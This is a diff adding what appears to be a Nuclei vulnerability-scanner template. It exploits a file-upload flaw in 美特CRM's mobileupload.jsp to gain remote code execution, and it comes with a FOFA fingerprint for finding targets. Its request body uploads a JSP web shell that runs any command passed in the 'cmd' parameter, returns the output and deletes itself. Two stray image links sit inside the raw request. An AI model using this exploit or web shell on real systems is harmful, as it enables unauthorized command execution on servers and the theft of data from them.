@@ -1,0 +1,47 @@
+id: poc-nag5gwwdh7ln21l4
+info:
+  name: 美特CRM mobileupload.jsp 存在文件上传致RCE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/nag5gwwdh7ln21l4'
+  tags: rce,file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: nag5gwwdh7ln21l4
+    fofa: body="/common/scripts/basic.js"
+http:
+- raw:
+  - 'POST /mobile/mobileupload.jsp HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
+
+    Accept-Encoding: gzip, deflate
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+    Accept: */*
+
+    Connection: close
+
+
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+    Content-Disposition: form-data; name="file"; filename="1.jsp"
+
+    Content-Type: image/jpeg
+
+
+    <% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("</pre>");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1752856612539-983ad59d-22a2-461a-95b3-809ee4c71880.png)
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1752856612814-339ec0bc-19fb-4c2c-b93c-9151e6c98e1f.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
